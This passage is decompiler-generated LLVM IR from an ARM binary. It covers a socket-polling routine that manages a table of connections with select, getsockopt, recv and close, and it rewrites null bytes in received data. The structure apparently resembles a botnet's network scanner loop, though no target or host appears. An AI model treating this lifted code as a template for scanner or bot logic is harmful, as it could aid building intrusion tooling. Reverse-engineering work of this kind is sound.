  %v2_104dc = icmp eq i32 %v3_104cc, 0
  store i1 %v2_104dc, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_104dc, label %bb337, label %dec_label_pc_1044c

dec_label_pc_104ec:                               ; preds = %dec_label_pc_fc3c
  store i32 ptrtoint (i32* @global_var_1a440.197 to i32), i32* %r2.global-to-local, align 4
  %v2_104f0 = load i32, i32* @global_var_1a440.197, align 4
  store i32 %v2_104f0, i32* %r0.global-to-local, align 4
  %v1_104f4 = call i32 @close(i32 %v2_104f0)
  store i32 %v1_104f4, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_103fc

dec_label_pc_104fc:                               ; preds = %dec_label_pc_10464
  store i32 %v3_104fc, i32* %r0.global-to-local, align 4
  %v3_10504 = udiv i32 %v3_104fc, 32
  %v3_10508 = mul nuw nsw i32 %v3_10504, 4
  store i32 %v2_1050c, i32* %lr.global-to-local, align 4
  %v2_10510 = add i32 %v3_10508, %v2_1050c
  store i32 %v2_10510, i32* %r3.global-to-local, align 4
  %v1_10514 = add i32 %v2_10510, -312
  %v2_10514 = inttoptr i32 %v1_10514 to i32*
  %v3_10514 = load i32, i32* %v2_10514, align 4
  %v1_10518 = urem i32 %v3_104fc, 32
  store i32 %v1_10518, i32* %r1.global-to-local, align 4
  %v7_1051c = shl i32 1, %v1_10518
  %v8_1051c = or i32 %v3_10514, %v7_1051c
  store i32 %v8_1051c, i32* %r2.global-to-local, align 4
  %v0_10520 = load i32, i32* @r5, align 4
  %v3_10520 = icmp uge i32 %v0_10520, %v3_104fc
  store i1 %v3_10520, i1* %cpsr_c.global-to-local, align 1
  %v9_10520 = icmp eq i32 %v0_10520, %v3_104fc
  store i1 %v9_10520, i1* %cpsr_z.global-to-local, align 1
  %v5_10524 = icmp slt i32 %v0_10520, %v3_104fc
  br i1 %v5_10524, label %bb338, label %bb339

bb338:                                            ; preds = %dec_label_pc_104fc
  store i32 %v3_104fc, i32* @r5, align 4
  br label %bb339

bb339:                                            ; preds = %dec_label_pc_104fc, %bb338
  store i32 %v8_1051c, i32* %v2_10514, align 4
  br label %bb337

dec_label_pc_10530:                               ; preds = %dec_label_pc_1044c
  %v1_10530 = add i32 %v2_104c8, 4
  %v2_10530 = inttoptr i32 %v1_10530 to i32*
  %v3_10530 = load i32, i32* %v2_10530, align 4
  store i32 %v3_10530, i32* %r0.global-to-local, align 4
  %v1_10534 = call i32 @close(i32 %v3_10530)
  store i32 %v1_10534, i32* %r0.global-to-local, align 4
  %v0_10538 = load i32, i32* @r4, align 4
  %v1_10538 = add i32 %v0_10538, 12
  %v2_10538 = inttoptr i32 %v1_10538 to i32*
  %v3_10538 = load i32, i32* %v2_10538, align 4
  store i32 %v3_10538, i32* %r3.global-to-local, align 4
  store i32 -1, i32* %r2.global-to-local, align 4
  %v2_10540 = icmp ugt i32 %v3_10538, 1
  store i1 %v2_10540, i1* %cpsr_c.global-to-local, align 1
  %v7_10540 = icmp eq i32 %v3_10538, 2
  store i1 %v7_10540, i1* %cpsr_z.global-to-local, align 1
  %v2_10544 = add i32 %v0_10538, 4
  %v3_10544 = inttoptr i32 %v2_10544 to i32*
  store i32 -1, i32* %v3_10544, align 4
  %v2_10548 = xor i1 %v2_10540, true
  %v3_10548 = or i1 %v7_10540, %v2_10548
  br i1 %v3_10548, label %dec_label_pc_10570, label %dec_label_pc_1054c

dec_label_pc_1054c:                               ; preds = %dec_label_pc_10530
  %v0_1054c = load i32, i32* @r4, align 4
  %v1_1054c = add i32 %v0_1054c, 284
  %v2_1054c = inttoptr i32 %v1_1054c to i8*
  %v3_1054c = load i8, i8* %v2_1054c, align 1
  %v4_1054c = zext i8 %v3_1054c to i32
  %v1_10550 = add nuw nsw i32 %v4_1054c, 1
  %v1_10554 = urem i32 %v1_10550, 256
  store i32 %v1_10554, i32* %r3.global-to-local, align 4
  %v2_10558 = icmp ugt i32 %v1_10554, 9
  store i1 %v2_10558, i1* %cpsr_c.global-to-local, align 1
  %v7_10558 = icmp eq i32 %v1_10554, 10
  store i1 %v7_10558, i1* %cpsr_z.global-to-local, align 1
  %v1_1055c = trunc i32 %v1_10550 to i8
  store i8 %v1_1055c, i8* %v2_1054c, align 1
  %v0_10560 = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_10560, label %dec_label_pc_10570, label %dec_label_pc_10564

dec_label_pc_10564:                               ; preds = %dec_label_pc_1054c
  %v0_10564 = load i32, i32* @r4, align 4
  store i32 %v0_10564, i32* @r0, align 4
  %v0_10568 = call i32 @function_f8e0()
  store i32 %v0_10568, i32* %r0.global-to-local, align 4
  br label %bb337

dec_label_pc_10570:                               ; preds = %dec_label_pc_1054c, %dec_label_pc_10530
  %v0_10570 = load i32, i32* @r7, align 4
  %v1_10570 = load i32, i32* @r4, align 4
  %v2_10570 = add i32 %v1_10570, 12
  %v3_10570 = inttoptr i32 %v2_10570 to i32*
  store i32 %v0_10570, i32* %v3_10570, align 4
  %v0_10574 = load i32, i32* @r7, align 4
  %v1_10574 = trunc i32 %v0_10574 to i8
  %v2_10574 = load i32, i32* @r4, align 4
  %v3_10574 = add i32 %v2_10574, 284
  %v4_10574 = inttoptr i32 %v3_10574 to i8*
  store i8 %v1_10574, i8* %v4_10574, align 1
  br label %bb337

dec_label_pc_1057c:                               ; preds = %bb337
  store i32 1, i32* %stack_var_-64, align 4
  %v0_10584 = load i32, i32* @r6, align 4
  %v1_10584 = load i32, i32* @r5, align 4
  %v3_10584 = icmp uge i32 %v0_10584, %v1_10584
  store i1 %v3_10584, i1* %cpsr_c.global-to-local, align 1
  %v9_10584 = icmp eq i32 %v0_10584, %v1_10584
  store i1 %v9_10584, i1* %cpsr_z.global-to-local, align 1
  %v5_10588 = icmp slt i32 %v0_10584, %v1_10584
  %storemerge108 = select i1 %v5_10588, i32 %v1_10584, i32 %v0_10584
  store i32 %v2_10594, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  store i32 %v2_1059c, i32* %ip.global-to-local, align 4
  store i32 %v2_105a0, i32* %r1.global-to-local, align 4
  %v1_105a4 = add i32 %storemerge108, 1
  store i32 %v1_105a4, i32* %r0.global-to-local, align 4
  %v13_105b0 = call i32 @select(i32 %v1_105a4, %_TYPEDEF_fd_set* %tmp341, %_TYPEDEF_fd_set* %tmp340, %_TYPEDEF_fd_set* null, %timeval* %tmp343)
  store i32 0, i32* %r0.global-to-local, align 4
  %v2_105b8 = call i32 @time(i32* null)
  store i32 ptrtoint (i32* @global_var_1a41c.182 to i32), i32* %lr.global-to-local, align 4
  store i32 %v2_105b8, i32* @global_var_1a41c.182, align 4
  store i32 0, i32* %r0.global-to-local, align 4
  store i32 0, i32* %r2.global-to-local, align 4
  store i32 0, i32* %stack_var_-52, align 4
  br label %dec_label_pc_10610

dec_label_pc_105d4:                               ; preds = %dec_label_pc_10634, %dec_label_pc_11190
  %v0_105ec = phi i32 [ %v3_10628, %dec_label_pc_10634 ], [ %v0_105d4.pre, %dec_label_pc_11190 ]
  %v3_105d4 = udiv i32 %v0_105ec, 32
  %v3_105dc = mul nuw nsw i32 %v3_105d4, 4
  store i32 %v2_1050c, i32* %lr.global-to-local, align 4
  %v2_105e4 = add i32 %v3_105dc, %v2_1050c
  store i32 %v2_105e4, i32* %r3.global-to-local, align 4
  %v1_105e8 = add i32 %v2_105e4, -184
  %v2_105e8 = inttoptr i32 %v1_105e8 to i32*
  %v3_105e8 = load i32, i32* %v2_105e8, align 4
  %v1_105ec = urem i32 %v0_105ec, 32
  store i32 %v1_105ec, i32* %r1.global-to-local, align 4
  %v2_105f0 = add nsw i32 %v1_105ec, -1
  %v3_105f0 = shl i32 1, %v2_105f0
  %v4_105f0 = and i32 %v3_105f0, %v3_105e8
  %v5_105f0 = icmp ne i32 %v4_105f0, 0
  store i1 %v5_105f0, i1* %cpsr_c.global-to-local, align 1
  %v6_105f0 = lshr i32 %v3_105e8, %v1_105ec
  store i32 %v6_105f0, i32* %r2.global-to-local, align 4
  %v1_105f4 = urem i32 %v6_105f0, 2
  %v2_105f4 = icmp eq i32 %v1_105f4, 0
  store i1 %v2_105f4, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_105f4, label %dec_label_pc_105fc, label %dec_label_pc_107c4.preheader

dec_label_pc_107c4.preheader:                     ; preds = %dec_label_pc_105d4
  %v0_107c4129 = load i32, i32* @r6, align 4
  %v1_107c4130 = add i32 %v0_107c4129, 12
  %v2_107c4131 = inttoptr i32 %v1_107c4130 to i32*
  %v3_107c4132 = load i32, i32* %v2_107c4131, align 4
  store i32 %v3_107c4132, i32* %r2.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_107c8128134 = icmp eq i32 %v3_107c4132, 0
  store i1 %v2_107c8128134, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_107c8128134, label %dec_label_pc_105fc, label %dec_label_pc_107d0.lr.ph

dec_label_pc_105fc:                               ; preds = %dec_label_pc_107c4.loopexit, %dec_label_pc_107c8.backedge, %dec_label_pc_107c4.preheader, %dec_label_pc_105d4, %.thread241, %dec_label_pc_110c0, %dec_label_pc_10610, %dec_label_pc_111a4, %dec_label_pc_11100
  %v3_105fc = load i32, i32* %stack_var_-52, align 4
  store i32 %v3_105fc, i32* %r3.global-to-local, align 4
  %v1_10600 = add i32 %v3_105fc, 1
  store i32 %v1_10600, i32* %r2.global-to-local, align 4
  %v2_10604 = icmp ugt i32 %v1_10600, 254
  store i1 %v2_10604, i1* %cpsr_c.global-to-local, align 1
  %v7_10604 = icmp eq i32 %v1_10600, 255
  store i1 %v7_10604, i1* %cpsr_z.global-to-local, align 1
  store i32 %v1_10600, i32* %stack_var_-52, align 4
  %v8_1060c = icmp sgt i32 %v1_10600, 255
  br i1 %v8_1060c, label %dec_label_pc_fe7c, label %dec_label_pc_10610

dec_label_pc_10610:                               ; preds = %dec_label_pc_105fc, %dec_label_pc_1057c
  %v0_1061c = phi i32 [ %v1_10600, %dec_label_pc_105fc ], [ 0, %dec_label_pc_1057c ]
  store i32 ptrtoint (i32* @global_var_1a43c.195 to i32), i32* %ip.global-to-local, align 4
  %v3_10614 = mul i32 %v0_1061c, 256
  store i32 %v3_10614, i32* %r3.global-to-local, align 4
  %v2_10618 = load i32, i32* @global_var_1a43c.195, align 4
  store i32 %v2_10618, i32* %r1.global-to-local, align 4
  %v2_10620 = mul i32 %v0_1061c, 288
  store i32 %v2_10620, i32* %r2.global-to-local, align 4
  %v2_10624 = add i32 %v2_10618, %v2_10620
  store i32 %v2_10624, i32* @r6, align 4
  %v1_10628 = add i32 %v2_10624, 4
  %v2_10628 = inttoptr i32 %v1_10628 to i32*
  %v3_10628 = load i32, i32* %v2_10628, align 4
  store i32 %v3_10628, i32* %r4.global-to-local, align 4
  %v2_1062c = icmp eq i32 %v3_10628, -1
  store i1 %v2_1062c, i1* %cpsr_c.global-to-local, align 1
  store i1 %v2_1062c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_1062c, label %dec_label_pc_105fc, label %dec_label_pc_10634

dec_label_pc_10634:                               ; preds = %dec_label_pc_10610
  %v3_10634 = udiv i32 %v3_10628, 32
  %v3_1063c = mul nuw nsw i32 %v3_10634, 4
  store i32 %v2_1050c, i32* %lr.global-to-local, align 4
  %v2_10644 = add i32 %v3_1063c, %v2_1050c
  store i32 %v2_10644, i32* %r3.global-to-local, align 4
  %v1_10648 = add i32 %v2_10644, -312
  %v2_10648 = inttoptr i32 %v1_10648 to i32*
  %v3_10648 = load i32, i32* %v2_10648, align 4
  %v1_1064c = urem i32 %v3_10628, 32
  store i32 %v1_1064c, i32* %r1.global-to-local, align 4
  %v2_10650 = add nsw i32 %v1_1064c, -1
  %v3_10650 = shl i32 1, %v2_10650
  %v4_10650 = and i32 %v3_10648, %v3_10650
  %v5_10650 = icmp ne i32 %v4_10650, 0
  store i1 %v5_10650, i1* %cpsr_c.global-to-local, align 1
  %v6_10650 = lshr i32 %v3_10648, %v1_1064c
  store i32 %v6_10650, i32* %r2.global-to-local, align 4
  %v1_10654 = urem i32 %v6_10650, 2
  %v2_10654 = icmp eq i32 %v1_10654, 0
  store i1 %v2_10654, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_10654, label %dec_label_pc_105d4, label %dec_label_pc_1065c

dec_label_pc_1065c:                               ; preds = %dec_label_pc_10634
  store i32 4, i32* %r2.global-to-local, align 4
  store i32 4, i32* %stack_var_-56, align 4
  store i32 %v2_10c30, i32* %r3.global-to-local, align 4
  store i32 %v2_10738, i32* %ip.global-to-local, align 4
  store i32 %v3_10628, i32* %r0.global-to-local, align 4
  store i32 0, i32* @r5, align 4
  store i32 1, i32* %r1.global-to-local, align 4
  store i32 0, i32* %stack_var_-48, align 4
  %v8_1068c = call i32 @getsockopt(i32 %v3_10628, i32 1, i32 4, i32* nonnull %stack_var_-48, i32* nonnull %stack_var_-56)
  %v3_10690 = load i32, i32* %stack_var_-48, align 4
  store i32 %v3_10690, i32* %r3.global-to-local, align 4
  %v2_10694 = or i32 %v3_10690, %v8_1068c
  store i32 %v2_10694, i32* %r0.global-to-local, align 4
  %v4_10694 = icmp eq i32 %v2_10694, 0
  store i1 %v4_10694, i1* %cpsr_z.global-to-local, align 1
  br i1 %v4_10694, label %dec_label_pc_1069c, label %dec_label_pc_111a4

dec_label_pc_1069c:                               ; preds = %dec_label_pc_1065c
  store i32 2, i32* %r2.global-to-local, align 4
  %v1_106a0 = load i32, i32* @r6, align 4
  %v2_106a0 = add i32 %v1_106a0, 12
  %v3_106a0 = inttoptr i32 %v2_106a0 to i32*
  store i32 2, i32* %v3_106a0, align 4
  %v0_106a4 = call i32 @function_f67c()
  %v3_106ac = load i8, i8* @global_var_1a419.189, align 1
  %v4_106ac = zext i8 %v3_106ac to i32
  store i32 %v4_106ac, i32* %r2.global-to-local, align 4
  %v2_106b0 = load i8, i8* bitcast (i8** @global_var_1a418.188 to i8*), align 4
  %v3_106b0 = zext i8 %v2_106b0 to i32
  %v4_106b4 = mul nuw nsw i32 %v4_106ac, 256
  %v5_106b4 = or i32 %v3_106b0, %v4_106b4
  store i32 %v5_106b4, i32* %r1.global-to-local, align 4
  %v2_106b8 = urem i32 %v0_106a4, %v5_106b4
  store i32 ptrtoint (i32* @global_var_1a3e8.184 to i32), i32* %r3.global-to-local, align 4
  %v2_106c0 = load i32, i32* @global_var_1a3e8.184, align 4
  store i32 %v2_106c0, i32* %lr.global-to-local, align 4
  %v1_106c8 = load i32, i32* @r5, align 4
  %v9_106c8 = icmp eq i32 %v2_106c0, %v1_106c8
  store i1 %v9_106c8, i1* %cpsr_z.global-to-local, align 1
  store i1 false, i1* %cpsr_c.global-to-local, align 1
  store i32 %v2_106b8, i32* %r0.global-to-local, align 4
  %v7_106d0 = icmp sgt i32 %v2_106c0, %v1_106c8
  br i1 %v7_106d0, label %dec_label_pc_106d4, label %dec_label_pc_1118c

dec_label_pc_106d4:                               ; preds = %dec_label_pc_1069c
  %v2_106d8 = load i32, i32* @global_var_1a414.186, align 4
  store i32 %v2_106d8, i32* %r3.global-to-local, align 4
  store i32 %v1_106c8, i32* %ip.global-to-local, align 4
  br label %dec_label_pc_106f4

dec_label_pc_106e4:                               ; preds = %dec_label_pc_1070c, %dec_label_pc_106f4
  %v1_106e4 = add i32 %v0_106e4, 1
  store i32 %v1_106e4, i32* %ip.global-to-local, align 4
  %v3_106e8 = icmp uge i32 %v1_106e4, %v2_106c0
  store i1 %v3_106e8, i1* %cpsr_c.global-to-local, align 1
  %v9_106e8 = icmp eq i32 %v1_106e4, %v2_106c0
  store i1 %v9_106e8, i1* %cpsr_z.global-to-local, align 1
  %v1_106ec = add i32 %v0_106ec, 16
  store i32 %v1_106ec, i32* %r3.global-to-local, align 4
  br i1 %v9_106e8, label %dec_label_pc_1118c, label %dec_label_pc_106f4

dec_label_pc_106f4:                               ; preds = %dec_label_pc_106e4, %dec_label_pc_106d4
  %v0_106e4 = phi i32 [ %v1_106e4, %dec_label_pc_106e4 ], [ %v1_106c8, %dec_label_pc_106d4 ]
  %v0_106ec = phi i32 [ %v1_106ec, %dec_label_pc_106e4 ], [ %v2_106d8, %dec_label_pc_106d4 ]
  store i32 %v0_106ec, i32* %r1.global-to-local, align 4
  %v1_106f8 = add i32 %v0_106ec, 9
  %v2_106f8 = inttoptr i32 %v1_106f8 to i8*
  %v3_106f8 = load i8, i8* %v2_106f8, align 1
  %v4_106f8 = zext i8 %v3_106f8 to i32
  store i32 %v4_106f8, i32* %r2.global-to-local, align 4
  %v1_106fc = add i32 %v0_106ec, 8
  %v2_106fc = inttoptr i32 %v1_106fc to i8*
  %v3_106fc = load i8, i8* %v2_106fc, align 1
  %v4_106fc = zext i8 %v3_106fc to i32
  %v4_10700 = mul nuw nsw i32 %v4_106f8, 256
  %v5_10700 = or i32 %v4_106fc, %v4_10700
  store i32 %v5_10700, i32* %r3.global-to-local, align 4
  %v3_10704 = icmp uge i32 %v5_10700, %v2_106b8
  store i1 %v3_10704, i1* %cpsr_c.global-to-local, align 1
  %v9_10704 = icmp eq i32 %v5_10700, %v2_106b8
  store i1 %v9_10704, i1* %cpsr_z.global-to-local, align 1
  %v2_10708 = xor i1 %v9_10704, true
  %v3_10708 = and i1 %v3_10704, %v2_10708
  br i1 %v3_10708, label %dec_label_pc_106e4, label %dec_label_pc_1070c

dec_label_pc_1070c:                               ; preds = %dec_label_pc_106f4
  %v1_1070c = add i32 %v0_106ec, 10
  %v2_1070c = inttoptr i32 %v1_1070c to i8*
  %v3_1070c = load i8, i8* %v2_1070c, align 1
  %v4_1070c = zext i8 %v3_1070c to i32
  store i32 %v4_1070c, i32* %r3.global-to-local, align 4
  %v1_10710 = add i32 %v0_106ec, 11
  %v2_10710 = inttoptr i32 %v1_10710 to i8*
  %v3_10710 = load i8, i8* %v2_10710, align 1
  %v4_10710 = zext i8 %v3_10710 to i32
  store i32 %v4_10710, i32* %r2.global-to-local, align 4
  %v4_10714 = mul nuw nsw i32 %v4_10710, 256
  %v5_10714 = or i32 %v4_10714, %v4_1070c
  store i32 %v5_10714, i32* %r3.global-to-local, align 4
  %v3_10718 = icmp uge i32 %v5_10714, %v2_106b8
  store i1 %v3_10718, i1* %cpsr_c.global-to-local, align 1
  %v9_10718 = icmp eq i32 %v5_10714, %v2_106b8
  store i1 %v9_10718, i1* %cpsr_z.global-to-local, align 1
  %v2_1071c = xor i1 %v3_10718, true
  %v3_1071c = or i1 %v9_10718, %v2_1071c
  br i1 %v3_1071c, label %dec_label_pc_106e4, label %dec_label_pc_11190

dec_label_pc_10724:                               ; preds = %dec_label_pc_1098c, %dec_label_pc_10960, %dec_label_pc_109a8
  store i32 26, i32* %r0.global-to-local, align 4
  %v1_10728 = call i32 @function_1134c(i32 26)
  store i32 27, i32* %r0.global-to-local, align 4
  %v1_10730 = call i32 @function_1134c(i32 27)
  store i32 %v2_10738, i32* %r1.global-to-local, align 4
  store i32 26, i32* %r0.global-to-local, align 4
  %v3_10740 = call i32 @function_11268(i32 26, i32* nonnull %stack_var_-56)
  store i32 %v3_10740, i32* @r4, align 4
  store i32 %v2_10738, i32* %r1.global-to-local, align 4
  store i32 27, i32* %r0.global-to-local, align 4
  %v3_10754 = call i32 @function_11268(i32 27, i32* nonnull %stack_var_-56)
  %v3_10758 = load i32, i32* %stack_var_-56, align 4
  store i32 %v3_10754, i32* @r5, align 4
  %v0_10760 = load i32, i32* @r4, align 4
  store i32 %v0_10760, i32* %r2.global-to-local, align 4
  %v1_10764 = add i32 %v3_10758, -1
  store i32 %v1_10764, i32* %r3.global-to-local, align 4
  %v0_10768 = load i32, i32* %r8.global-to-local, align 4
  store i32 %v0_10768, i32* %r0.global-to-local, align 4
  %v0_1076c = load i32, i32* @r6, align 4
  %v1_1076c = add i32 %v0_1076c, 24
  %v2_1076c = inttoptr i32 %v1_1076c to i32*
  %v3_1076c = load i32, i32* %v2_1076c, align 4
  store i32 %v3_1076c, i32* %r1.global-to-local, align 4
  %v4_10770 = call i32 @function_1185c(i32 %v0_10768, i32 %v3_1076c, i32 %v0_10760, i32 %v1_10764)
  store i32 %v4_10770, i32* %r0.global-to-local, align 4
  %v2_10774 = icmp eq i32 %v4_10770, -1
  store i1 %v2_10774, i1* %cpsr_c.global-to-local, align 1
  %v7_10774 = icmp eq i32 %v4_10770, -1
  store i1 %v7_10774, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_10774, label %dec_label_pc_10784, label %dec_label_pc_107ac

dec_label_pc_10784:                               ; preds = %dec_label_pc_10724
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  store i1 true, i1* %cpsr_z.global-to-local, align 1
  %v3_10784 = load i32, i32* %stack_var_-56, align 4
  %v0_10788 = load i32, i32* @r5, align 4
  store i32 %v0_10788, i32* %r2.global-to-local, align 4
  %v1_1078c = add i32 %v3_10784, -1
  store i32 %v1_1078c, i32* %r3.global-to-local, align 4
  %v0_10790 = load i32, i32* %r8.global-to-local, align 4
  store i32 %v0_10790, i32* %r0.global-to-local, align 4
  %v0_10794 = load i32, i32* @r6, align 4
  %v1_10794 = add i32 %v0_10794, 24
  %v2_10794 = inttoptr i32 %v1_10794 to i32*
  %v3_10794 = load i32, i32* %v2_10794, align 4
  store i32 %v3_10794, i32* %r1.global-to-local, align 4
  %v4_10798 = call i32 @function_1185c(i32 %v0_10790, i32 %v3_10794, i32 %v0_10788, i32 %v1_1078c)
  store i32 %v4_10798, i32* %r0.global-to-local, align 4
  %v2_1079c = icmp eq i32 %v4_10798, -1
  store i1 %v2_1079c, i1* %cpsr_c.global-to-local, align 1
  %v7_1079c = icmp eq i32 %v4_10798, -1
  store i1 %v7_1079c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_1079c, label %dec_label_pc_111c0, label %dec_label_pc_107ac

dec_label_pc_107ac:                               ; preds = %dec_label_pc_10784, %dec_label_pc_10724
  store i32 1, i32* @r7, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  store i1 false, i1* %cpsr_z.global-to-local, align 1
  store i32 26, i32* %r0.global-to-local, align 4
  %v1_107b0 = call i32 @function_11294(i32 26)
  store i32 27, i32* %r0.global-to-local, align 4
  %v1_107b8 = call i32 @function_11294(i32 27)
  store i32 %v1_107b8, i32* %r0.global-to-local, align 4
  %v0_107bc = load i32, i32* @r7, align 4
  %v3_107bc = icmp eq i32 %v0_107bc, -1
  store i1 %v3_107bc, i1* %cpsr_c.global-to-local, align 1
  store i1 %v3_107bc, i1* %cpsr_z.global-to-local, align 1
  br i1 %v3_107bc, label %dec_label_pc_107c4.loopexit, label %dec_label_pc_109c4

dec_label_pc_107c4.loopexit:                      ; preds = %dec_label_pc_10950.thread, %dec_label_pc_10950, %dec_label_pc_10ffc, %dec_label_pc_10844, %dec_label_pc_107ac, %dec_label_pc_10fe8
  %v0_107c4 = load i32, i32* @r6, align 4
  %v1_107c4 = add i32 %v0_107c4, 12
  %v2_107c4 = inttoptr i32 %v1_107c4 to i32*
  %v3_107c4 = load i32, i32* %v2_107c4, align 4
  store i32 %v3_107c4, i32* %r2.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_107c8128 = icmp eq i32 %v3_107c4, 0
  store i1 %v2_107c8128, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_107c8128, label %dec_label_pc_105fc, label %dec_label_pc_107d0.lr.ph

dec_label_pc_107d0.lr.ph:                         ; preds = %dec_label_pc_107c4.preheader, %dec_label_pc_107c4.loopexit
  %v0_107d0161 = phi i32 [ %v0_107c4, %dec_label_pc_107c4.loopexit ], [ %v0_107c4129, %dec_label_pc_107c4.preheader ]
  br label %dec_label_pc_107d0

dec_label_pc_107d0:                               ; preds = %dec_label_pc_107c8.backedge.thread, %dec_label_pc_107c8.backedge, %dec_label_pc_107c8.backedge.thread501, %dec_label_pc_107d0.lr.ph
  %v0_11138 = phi i32 [ %v0_107d0161, %dec_label_pc_107d0.lr.ph ], [ %v0_107d0158, %dec_label_pc_107c8.backedge ], [ %v0_10844, %dec_label_pc_107c8.backedge.thread ], [ %v0_10844, %dec_label_pc_107c8.backedge.thread501 ]
  %v1_107d0 = add i32 %v0_11138, 24
  %v2_107d0 = inttoptr i32 %v1_107d0 to i32*
  %v3_107d0 = load i32, i32* %v2_107d0, align 4
  store i32 %v3_107d0, i32* %r3.global-to-local, align 4
  %v2_107d4 = icmp ugt i32 %v3_107d0, 255
  store i1 %v2_107d4, i1* %cpsr_c.global-to-local, align 1
  %v7_107d4 = icmp eq i32 %v3_107d0, 256
  store i1 %v7_107d4, i1* %cpsr_z.global-to-local, align 1
  %.pre = add i32 %v0_11138, 28
  store i32 %.pre, i32* %r8.global-to-local, align 4
  br i1 %v7_107d4, label %dec_label_pc_11138, label %dec_label_pc_107e0

dec_label_pc_107e0:                               ; preds = %dec_label_pc_107d0, %dec_label_pc_11138
  store i32 0, i32* @r5, align 4
  %v1_107e4 = load i32, i32* @sb, align 4
  %v2_107e4 = inttoptr i32 %v1_107e4 to i32*
  store i32 0, i32* %v2_107e4, align 4
  %v0_107e8 = load i32, i32* @r6, align 4
  %v1_107e8 = add i32 %v0_107e8, 24
  %v2_107e8 = inttoptr i32 %v1_107e8 to i32*
  %v3_107e8 = load i32, i32* %v2_107e8, align 4
  store i32 %v3_107e8, i32* %r2.global-to-local, align 4
  %v0_107ec = load i32, i32* %r8.global-to-local, align 4
  %v2_107ec = add i32 %v0_107ec, %v3_107e8
  store i32 %v2_107ec, i32* @r4, align 4
  %v1_107f0 = add i32 %v0_107e8, 4
  %v2_107f0 = inttoptr i32 %v1_107f0 to i32*
  %v3_107f0 = load i32, i32* %v2_107f0, align 4
  store i32 %v3_107f0, i32* %r0.global-to-local, align 4
  %v1_107f4 = sub i32 256, %v3_107e8
  store i32 %v1_107f4, i32* %r2.global-to-local, align 4
  store i32 %v2_107ec, i32* %r1.global-to-local, align 4
  store i32 16384, i32* %r3.global-to-local, align 4
  %v4_10800 = inttoptr i32 %v2_107ec to i32*
  %v5_10800 = call i32 @recv(i32 %v3_107f0, i32* %v4_10800, i32 %v1_107f4, i32 16384)
  store i32 %v5_10800, i32* %r0.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_10804 = icmp eq i32 %v5_10800, 0
  store i1 %v2_10804, i1* %cpsr_z.global-to-local, align 1
  %tmp345 = icmp slt i32 %v5_10800, 1
  br i1 %tmp345, label %dec_label_pc_110b4, label %dec_label_pc_1080c

dec_label_pc_1080c:                               ; preds = %dec_label_pc_107e0
  %v0_1080c = load i32, i32* @r5, align 4
  store i32 %v0_1080c, i32* %r2.global-to-local, align 4
  store i32 65, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_10814

dec_label_pc_10814:                               ; preds = %bb347, %dec_label_pc_1080c
  %v3_1081c = phi i32 [ %v1_10820, %bb347 ], [ %v0_1080c, %dec_label_pc_1080c ]
  %v1_10814 = load i32, i32* @r4, align 4
  %v2_10814 = add i32 %v1_10814, %v3_1081c
  %v3_10814 = inttoptr i32 %v2_10814 to i8*
  %v4_10814 = load i8, i8* %v3_10814, align 1
  %v6_10814 = zext i8 %v4_10814 to i32
  store i32 %v6_10814, i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_10818 = icmp eq i8 %v4_10814, 0
  store i1 %v2_10818, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_10818, label %bb346, label %bb347

bb346:                                            ; preds = %dec_label_pc_10814
  %v1_1081c = load i32, i32* %r1.global-to-local, align 4
  %v2_1081c = trunc i32 %v1_1081c to i8
  store i8 %v2_1081c, i8* %v3_10814, align 1
  %v0_10820.pre = load i32, i32* %r2.global-to-local, align 4
  br label %bb347

bb347:                                            ; preds = %dec_label_pc_10814, %bb346
  %v0_10820 = phi i32 [ %v3_1081c, %dec_label_pc_10814 ], [ %v0_10820.pre, %bb346 ]
  %v1_10820 = add i32 %v0_10820, 1
  store i32 %v1_10820, i32* %r2.global-to-local, align 4
  %v3_10824 = icmp uge i32 %v5_10800, %v1_10820
  store i1 %v3_10824, i1* %cpsr_c.global-to-local, align 1
  %v9_10824 = icmp eq i32 %v5_10800, %v1_10820
  store i1 %v9_10824, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_10824, label %dec_label_pc_1082c, label %dec_label_pc_10814

dec_label_pc_1082c:                               ; preds = %bb347, %dec_label_pc_110b8
  store i32 ptrtoint (i32* @global_var_1a41c.182 to i32), i32* %r1.global-to-local, align 4
  %v0_10830 = load i32, i32* @r6, align 4
  %v1_10830 = add i32 %v0_10830, 24
  %v2_10830 = inttoptr i32 %v1_10830 to i32*
  %v3_10830 = load i32, i32* %v2_10830, align 4
  %v2_10834 = load i32, i32* @global_var_1a41c.182, align 4
  store i32 %v2_10834, i32* %r3.global-to-local, align 4
  %v2_10838 = add i32 %v3_10830, %v5_10800
  store i32 %v2_10838, i32* %ip.global-to-local, align 4
  store i32 %v2_10838, i32* %v2_10830, align 4
  %v0_10840 = load i32, i32* %r3.global-to-local, align 4
  %v1_10840 = load i32, i32* @r6, align 4
  %v2_10840 = add i32 %v1_10840, 8
  %v3_10840 = inttoptr i32 %v2_10840 to i32*
  store i32 %v0_10840, i32* %v3_10840, align 4
  br label %dec_label_pc_10844

dec_label_pc_10844:                               ; preds = %dec_label_pc_10d00, %dec_label_pc_1082c
  %v0_10844 = load i32, i32* @r6, align 4
  %v1_10844 = add i32 %v0_10844, 12
  %v2_10844 = inttoptr i32 %v1_10844 to i32*
  %v3_10844 = load i32, i32* %v2_10844, align 4
  store i32 %v3_10844, i32* %r2.global-to-local, align 4
  %v1_10848 = add i32 %v3_10844, -2
